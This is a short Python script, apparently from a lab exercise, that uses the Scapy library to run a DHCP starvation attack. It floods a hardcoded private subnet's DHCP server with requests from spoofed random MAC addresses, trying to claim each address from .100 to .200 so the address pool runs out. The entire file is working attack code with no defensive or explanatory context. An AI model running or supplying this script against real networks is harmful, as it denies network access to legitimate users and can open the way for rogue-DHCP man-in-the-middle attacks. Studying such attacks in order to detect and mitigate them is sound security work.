import sys
import os
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import*
conf.checkIPaddr = False
subnet="10.10.111."
def starvation():
    for ip in range(100,201):
        for i in range(0,8):
            dhcp_disc=Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12, '0123456789abcdef'))/DHCP(options=[("message-type","request"),("server-id","10.10.111.1"),("requested_addr",subnet+ str(ip)),"end"])
            send(dhcp_disc)
            print "Requesting: "+subnet+str(ip)+"\n"
            time.sleep(1)
starvation()            